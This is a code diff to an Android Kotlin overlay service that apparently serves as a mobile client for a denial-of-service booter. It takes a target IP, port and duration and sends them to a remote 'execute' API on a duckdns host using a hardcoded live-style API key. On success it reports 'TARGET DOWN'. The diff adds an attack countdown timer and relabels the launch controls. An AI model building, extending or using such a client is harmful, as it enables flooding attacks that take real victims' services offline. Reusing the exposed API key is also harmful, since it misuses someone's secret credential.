@@ -27,6 +27,7 @@ class FloatingService : Service() {
     private lateinit var btnGetIp: Button
     private lateinit var tvLog: TextView
     private var selectedTime = 120
+    private var attackTimer: Thread? = null
 
     companion object {
         var instance: FloatingService? = null
@@ -108,7 +109,7 @@ class FloatingService : Service() {
         seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
             override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                 selectedTime = 60 + (progress * 10) 
-                tvTime.text = "DURATION: ${selectedTime}s"
+                tvTime.text = "ATTACK DURATION: ${selectedTime}s"
             }
             override fun onStartTrackingTouch(seekBar: SeekBar?) {}
             override fun onStopTrackingTouch(seekBar: SeekBar?) {}
@@ -126,8 +127,8 @@ class FloatingService : Service() {
             tvLog.text = "> VPN STOPPED"
             btnGetIp.text = "GET IP"
             btnGetIp.isEnabled = true
-            btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1F2937"))
-            btnGetIp.setTextColor(android.graphics.Color.parseColor("#FBBF24"))
+            btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1A102E"))
+            btnGetIp.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
         }
 
         btnAttack.setOnClickListener {
@@ -139,11 +140,36 @@ class FloatingService : Service() {
             }
             btnAttack.text = "LAUNCHING..."
             btnAttack.isEnabled = false
-            tvLog.text = "> ATTACK SENT [${selectedTime}s]"
-            executeAttack(ip, port, selectedTime)
+            startAttackTimer(ip, port, selectedTime)
         }
 
         setupPanelDragAndResize()
+    }
+
+    private fun startAttackTimer(ip: String, port: String, time: Int) {
+        executeAttack(ip, port, time)
+        
+        attackTimer?.interrupt()
+        attackTimer = Thread {
+            try {
+                var remaining = time
+                while (remaining > 0) {
+                    Handler(Looper.getMainLooper()).post {
+                        tvLog.text = "> ATTACKING: ${remaining}s left"
+                        tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
+                    }
+                    Thread.sleep(1000)
+                    remaining--
+                }
+                Handler(Looper.getMainLooper()).post {
+                    tvLog.text = "> ATTACK COMPLETED"
+                    tvLog.setTextColor(android.graphics.Color.parseColor("#22C55E"))
+                    btnAttack.text = "LAUNCH ATTACK 🚀"
+                    btnAttack.isEnabled = true
+                }
+            } catch (e: InterruptedException) {}
+        }
+        attackTimer?.start()
     }
 
     private var initialX = 0
@@ -187,7 +213,7 @@ class FloatingService : Service() {
                 MotionEvent.ACTION_MOVE -> {
                     val newWidth = initialWidth + (event.rawX - initialTouchX).toInt()
                     val newHeight = initialHeight + (event.rawY - initialTouchY).toInt()
-                    paramsPanel.width = if (newWidth > 300) newWidth else 300
+                    paramsPanel.width = if (newWidth > 280) newWidth else 280
                     paramsPanel.height = if (newHeight > 200) newHeight else WindowManager.LayoutParams.WRAP_CONTENT
                     windowManager.updateViewLayout(floatingView, paramsPanel)
                     true
@@ -239,8 +265,6 @@ class FloatingService : Service() {
             var conn: HttpURLConnection? = null
             try {
                 val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
-                
-                // DIRECT API KEY (No Decryption needed)
                 val apiKey = "sp_live_065a318078f3efc19e0be720102e9a7e"
 
                 var finalIp = ip
@@ -281,7 +305,7 @@ class FloatingService : Service() {
                         btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                         tvLog.text = "> SUCCESS! TARGET DOWN"
                     } else {
-                        btnAttack.text = "LAUNCH 🚀"
+                        btnAttack.text = "LAUNCH ATTACK 🚀"
                         btnAttack.isEnabled = true
                         tvLog.text = "> FAIL: $responseCode $responseMsg"
                         Toast.makeText(this@FloatingService, "Error: $responseMsg", Toast.LENGTH_LONG).show()
@@ -289,7 +313,7 @@ class FloatingService : Service() {
                 }
             } catch (e: Exception) {
                 Handler(Looper.getMainLooper()).post {
-                    btnAttack.text = "LAUNCH 🚀"
+                    btnAttack.text = "LAUNCH ATTACK 🚀"
                     btnAttack.isEnabled = true
                     tvLog.text = "> NETWORK FAIL"
                     Toast.makeText(this@FloatingService, "Net Err: ${e.message?.take(20)}", Toast.LENGTH_LONG).show()
@@ -305,6 +329,7 @@ class FloatingService : Service() {
         try {
             if (::floatingView.isInitialized) windowManager.removeView(floatingView)
             if (::bubbleView.isInitialized) windowManager.removeView(bubbleView)
+            attackTimer?.interrupt()
         } catch (e: Exception) {}
     }
 
